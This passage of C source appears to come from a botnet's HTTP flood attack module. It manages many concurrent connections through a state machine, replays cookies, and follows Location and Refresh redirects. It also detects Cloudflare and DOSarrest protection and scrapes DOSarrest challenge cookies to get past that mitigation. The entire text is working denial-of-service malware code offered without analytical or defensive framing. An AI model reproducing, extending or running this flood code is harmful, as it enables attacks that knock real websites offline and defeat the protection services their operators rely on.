                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                    util_strcpy(buf + util_strlen(buf), " ");
                    util_itoa(util_strlen(postdata), 10, buf + util_strlen(buf));
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                if (conn->num_cookies > 0)
                {
                    util_strcpy(buf + util_strlen(buf), "Cookie: ");
                    for (ii = 0; ii < conn->num_cookies; ii++)
                    {
                        util_strcpy(buf + util_strlen(buf), conn->cookies[ii]);
                        util_strcpy(buf + util_strlen(buf), "; ");
                    }
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                }

                util_strcpy(buf + util_strlen(buf), "\r\n");

                if (postdata != NULL)
                    util_strcpy(buf + util_strlen(buf), postdata);

                if (!util_strcmp(conn->method, conn->orig_method))
                    util_strcpy(conn->method, conn->orig_method);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf("sending buf: \"%s\"\n", buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_RECV_HEADER;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_HEADER)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_RECV_BODY)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_QUEUE_RESTART)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CLOSED)
            {
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
#ifdef DEBUG
                    printf("[http flood] FD%d connected.\n", conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                }
                else
                {
#ifdef DEBUG
                    printf("[http flood] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = HTTP_CONN_INIT;
                    continue;
                }
            }

        if (FD_ISSET(conn->fd, &fdset_rd))
            {
                if (conn->state == HTTP_CONN_RECV_HEADER)
                {
                    int processed = 0;

                    util_zero(generic_memes, 10240);
                    if ((ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL | MSG_PEEK)) < 1)
                    {
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }


                    // we want to process a full http header (^:
                    if (util_memsearch(generic_memes, ret, "\r\n\r\n", 4) == -1 && ret < 10240)
                        continue;

                    generic_memes[util_memsearch(generic_memes, ret, "\r\n\r\n", 4)] = 0;

#ifdef DEBUG
                    if (sockets == 1)
                        printf("[http flood] headers: \"%s\"\n", generic_memes);
#endif

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_CLOUDFLARE;

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_DOSARREST, NULL)) != -1)
                        conn->protection_type = HTTP_PROT_DOSARREST;

                    conn->keepalive = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, NULL)))
                                conn->keepalive = 1;
                        }
                    }

                    conn->chunked = 0;
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *con_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            if (util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, NULL)))
                                conn->chunked = 1;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *len_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            conn->content_length = util_atoi(len_ptr, 10);
                        }
                    } else {
                        conn->content_length = 0;
                    }

                    processed = 0;
                    while (util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL)) != -1 && conn->num_cookies < HTTP_COOKIE_MAX)
                    {
                        int offset = util_stristr(generic_memes + processed, ret, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, NULL));
                        if (generic_memes[processed + offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *cookie_ptr = &(generic_memes[processed + offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;

                            if (util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) > 0)
                                nl_off = util_memsearch(generic_memes + processed + offset, ret - processed - offset, ";", 1) - 1;

                            generic_memes[processed + offset + nl_off] = 0;

                            for (ii = 0; ii < util_strlen(cookie_ptr); ii++)
                                if (cookie_ptr[ii] == '=')
                                    break;

                            if (cookie_ptr[ii] == '=')
                            {
                                int equal_off = ii, cookie_exists = FALSE;

                                for (ii = 0; ii < conn->num_cookies; ii++)
                                    if (util_strncmp(cookie_ptr, conn->cookies[ii], equal_off))
                                    {
                                        cookie_exists = TRUE;
                                        break;
                                    }

                                if (!cookie_exists)
                                {
                                    if (util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX)
                                    {
                                        util_strcpy(conn->cookies[conn->num_cookies], cookie_ptr);
                                        conn->num_cookies++;
                                    }
                                }
                            }
                        }

                        processed += offset;
                    }

                    // this will still work as previous handlers will only add in null chars or similar
                    // and we specify the size of the string to stristr
                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_LOCATION_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            if (util_memsearch(loc_ptr, nl_off, "http", 4) == 4)
                            {
                                //this is an absolute url, domain name change maybe?
                                ii = 7;
                                //http(s)
                                if (loc_ptr[4] == 's')
                                    ii++;

                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                ii = 0;
                                while (loc_ptr[ii] != 0)
                                {
                                    if (loc_ptr[ii] == '/')
                                    {
                                        loc_ptr[ii] = 0;
                                        break;
                                    }
                                    ii++;
                                }

                                // domain: loc_ptr;
                                // path: &(loc_ptr[ii + 1]);

                                if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                    util_strcpy(conn->domain, loc_ptr);

                                if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                {
                                    util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                    if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                        util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                }
                            }
                            else if (loc_ptr[0] == '/')
                            {
                                //handle relative url
                                util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                if (util_strlen(&(loc_ptr[ii + 1])) > 0 && util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                            }

                            conn->state = HTTP_CONN_RESTART;
                            continue;
                        }
                    }

                    if (util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL)) != -1)
                    {
                        int offset = util_stristr(generic_memes, ret, table_retrieve_val(TABLE_ATK_REFRESH_HDR, NULL));
                        if (generic_memes[offset] == ' ')
                            offset++;

                        int nl_off = util_memsearch(generic_memes + offset, ret - offset, "\r\n", 2);
                        if (nl_off != -1)
                        {
                            char *loc_ptr = &(generic_memes[offset]);

                            if (nl_off >= 2)
                                nl_off -= 2;
                            generic_memes[offset + nl_off] = 0;

                            //increment it one so that it is length of the string excluding null char instead of 0-based offset
                            nl_off++;

                            ii = 0;

                            while (loc_ptr[ii] != 0 && loc_ptr[ii] >= '0' && loc_ptr[ii] <= '9')
                                ii++;

                            if (loc_ptr[ii] != 0)
                            {
                                int wait_time = 0;
                                loc_ptr[ii] = 0;
                                ii++;

                                if (loc_ptr[ii] == ' ')
                                    ii++;

                                if (util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=") != -1)
                                    ii += util_stristr(&(loc_ptr[ii]), util_strlen(&(loc_ptr[ii])), "url=");

                                if (loc_ptr[ii] == '"')
                                {
                                    ii++;

                                    //yes its ugly, but i dont care
                                    if ((&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] == '"')
                                        (&(loc_ptr[ii]))[util_strlen(&(loc_ptr[ii])) - 1] = 0;
                                }

                                wait_time = util_atoi(loc_ptr, 10);

                                //YOLO LOL
                                while (wait_time > 0 && wait_time < 10 && fake_time + wait_time > time(NULL))
                                    sleep(1);

                                loc_ptr = &(loc_ptr[ii]);


                                if (util_stristr(loc_ptr, util_strlen(loc_ptr), "http") == 4)
                                {
                                    //this is an absolute url, domain name change maybe?
                                    ii = 7;
                                    //http(s)
                                    if (loc_ptr[4] == 's')
                                        ii++;

                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);
                                    ii = 0;
                                    while (loc_ptr[ii] != 0)
                                    {
                                        if (loc_ptr[ii] == '/')
                                        {
                                            loc_ptr[ii] = 0;
                                            break;
                                        }
                                        ii++;
                                    }

                                    // domain: loc_ptr;
                                    // path: &(loc_ptr[ii + 1]);

                                    if (util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX)
                                        util_strcpy(conn->domain, loc_ptr);

                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }
                                else if (loc_ptr[0] == '/')
                                {
                                    //handle relative url
                                    if (util_strlen(&(loc_ptr[ii + 1])) < HTTP_PATH_MAX)
                                    {
                                        util_zero(conn->path + 1, HTTP_PATH_MAX - 1);
                                        if (util_strlen(&(loc_ptr[ii + 1])) > 0)
                                            util_strcpy(conn->path + 1, &(loc_ptr[ii + 1]));
                                    }
                                }

                                strcpy(conn->method, "GET");
                                // queue the state up for the next time
                                conn->state = HTTP_CONN_QUEUE_RESTART;
                                continue;
                            }
                        }
                    }

                    // actually pull the content from the buffer that we processed via MSG_PEEK
                    processed = util_memsearch(generic_memes, ret, "\r\n\r\n", 4);

                    if (util_strcmp(conn->method, "POST") || util_strcmp(conn->method, "GET"))
                        conn->state = HTTP_CONN_RECV_BODY;
                    else if (ret > processed)
                        conn->state = HTTP_CONN_QUEUE_RESTART;
                    else
                        conn->state = HTTP_CONN_RESTART;

                    ret = recv(conn->fd, generic_memes, processed, MSG_NOSIGNAL);
                } else if (conn->state == HTTP_CONN_RECV_BODY) {
                    while (TRUE)
                    {
                        // spooky doods changed state
                        if (conn->state != HTTP_CONN_RECV_BODY)
                        {
                            break;
                        }

                        if (conn->rdbuf_pos == HTTP_RDBUF_SIZE)
                        {
                            memmove(conn->rdbuf, conn->rdbuf + HTTP_HACK_DRAIN, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                            conn->rdbuf_pos -= HTTP_HACK_DRAIN;
                        }
                        errno = 0;
                        ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, HTTP_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }

                        conn->rdbuf_pos += ret;
                        conn->last_recv = fake_time;

                        while (TRUE)
                        {
                            int consumed = 0;

                            if (conn->content_length > 0)
                            {

                                consumed = conn->content_length > conn->rdbuf_pos ? conn->rdbuf_pos : conn->content_length;
                                conn->content_length -= consumed;

                                if (conn->protection_type == HTTP_PROT_DOSARREST)
                                {
                                    // we specifically want this to be case sensitive
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11) != -1)
                                    {
                                        int start_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, NULL), 11);
                                        int end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                        conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                        if (conn->num_cookies < HTTP_COOKIE_MAX && util_strlen(&(conn->rdbuf[start_pos])) < HTTP_COOKIE_LEN_MAX)
                                        {
                                            util_strcpy(conn->cookies[conn->num_cookies], &(conn->rdbuf[start_pos]));
                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), "=");

                                            start_pos += end_pos + 3;
                                            end_pos = util_memsearch(&(conn->rdbuf[start_pos]), conn->rdbuf_pos - start_pos, "'", 1);
                                            conn->rdbuf[start_pos + (end_pos - 1)] = 0;

                                            util_strcpy(conn->cookies[conn->num_cookies] + util_strlen(conn->cookies[conn->num_cookies]), &(conn->rdbuf[start_pos]));
                                            conn->num_cookies++;
                                        }

                                        conn->content_length = -1;
                                        conn->state = HTTP_CONN_QUEUE_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (conn->content_length == 0)
                            {
                                if (conn->chunked == 1)
                                {
                                    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2) != -1)
                                    {
                                        int new_line_pos = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "\r\n", 2);
                                        conn->rdbuf[new_line_pos - 2] = 0;
                                        if (util_memsearch(conn->rdbuf, new_line_pos, ";", 1) != -1)
                                            conn->rdbuf[util_memsearch(conn->rdbuf, new_line_pos, ";", 1)] = 0;

                                        int chunklen = util_atoi(conn->rdbuf, 16);

                                        if (chunklen == 0)
                                        {
                                            conn->state = HTTP_CONN_RESTART;
                                            break;
                                        }

                                        conn->content_length = chunklen + 2;
                                        consumed = new_line_pos;
                                    }
                                } else {
                                    // get rid of any extra in the buf before we move on...
                                    conn->content_length = conn->rdbuf_pos - consumed;
                                    if (conn->content_length == 0)
                                    {
                                        conn->state = HTTP_CONN_RESTART;
                                        break;
                                    }
                                }
                            }

                            if (consumed == 0)
                                break;
                            else
                            {
                                conn->rdbuf_pos -= consumed;
                                memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                                conn->rdbuf[conn->rdbuf_pos] = 0;

                                if (conn->rdbuf_pos == 0)
                                    break;
                            }
                        }
                    }
                } else if (conn->state == HTTP_CONN_QUEUE_RESTART) {
                    while(TRUE)
                    {
                        errno = 0;
                        ret = recv(conn->fd, generic_memes, 10240, MSG_NOSIGNAL);
                        if (ret == 0)
                        {
#ifdef DEBUG
                            printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed\n", conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf("[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf("debug mode sleep\n");
            sleep(1);
        }
#endif
    }
}
